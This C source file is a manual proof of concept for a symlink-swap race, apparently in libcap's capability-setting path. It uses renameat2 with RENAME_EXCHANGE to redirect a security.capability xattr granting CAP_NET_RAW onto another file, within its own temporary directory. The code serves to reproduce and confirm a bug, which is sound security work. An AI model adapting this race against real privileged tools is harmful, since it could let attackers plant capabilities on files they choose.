#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif

#ifndef SYS_renameat2
#ifdef __NR_renameat2
#define SYS_renameat2 __NR_renameat2
#elif defined(__x86_64__)
#define SYS_renameat2 316
#elif defined(__aarch64__)
#define SYS_renameat2 276
#else
#error "renameat2 syscall number is unknown on this architecture"
#endif
#endif

#define XATTR_NAME_CAPS "security.capability"

static const unsigned char xattr_cap_net_raw[20] = {
    0x01, 0x00, 0x00, 0x02,
    0x00, 0x20, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
};

static char arena[256];
static char decoy[280];
static char target[280];
static char link_path[280];

static void cleanup(void) {
    removexattr(target, XATTR_NAME_CAPS);
    unlink(decoy);
    unlink(link_path);
    unlink(target);
    rmdir(arena);
}

static void die(const char *label) {
    fprintf(stderr, "%s: %s\n", label, strerror(errno));
    exit(1);
}

int main(void) {
    struct stat st;
    int fd;
    ssize_t len;
    unsigned char buf[32];

    if (geteuid() != 0) {
        fprintf(stderr, "manual_toctou_poc requires root or CAP_SETFCAP\n");
        return 1;
    }

    snprintf(arena, sizeof(arena), "/tmp/libcap-manual-poc-%d", getpid());
    snprintf(decoy, sizeof(decoy), "%s/decoy", arena);
    snprintf(target, sizeof(target), "%s/target", arena);
    snprintf(link_path, sizeof(link_path), "%s/link", arena);

    atexit(cleanup);

    if (mkdir(arena, 0755) != 0) {
        die("mkdir");
    }
    fd = open(decoy, O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd < 0) {
        die("open decoy");
    }
    close(fd);
    fd = open(target, O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd < 0) {
        die("open target");
    }
    close(fd);
    if (symlink(target, link_path) != 0) {
        die("symlink");
    }

    if (lstat(decoy, &st) != 0) {
        die("lstat");
    }
    printf("[manual] lstat sees a regular file: S_ISREG=%d S_ISLNK=%d\n",
           S_ISREG(st.st_mode), S_ISLNK(st.st_mode));

    if (syscall(SYS_renameat2, AT_FDCWD, link_path, AT_FDCWD, decoy,
                RENAME_EXCHANGE) != 0) {
        die("renameat2");
    }
    printf("[manual] swapped decoy with symlink using renameat2(RENAME_EXCHANGE)\n");

    if (setxattr(decoy, XATTR_NAME_CAPS, xattr_cap_net_raw,
                 sizeof(xattr_cap_net_raw), 0) != 0) {
        die("setxattr");
    }

    len = getxattr(target, XATTR_NAME_CAPS, buf, sizeof(buf));
    if (len <= 0) {
        fprintf(stderr, "[manual] expected capability xattr on target, got %zd\n",
                len);
        return 1;
    }

    printf("[manual] bug confirmed: %zd-byte capability xattr landed on target\n",
           len);
    return 0;
}
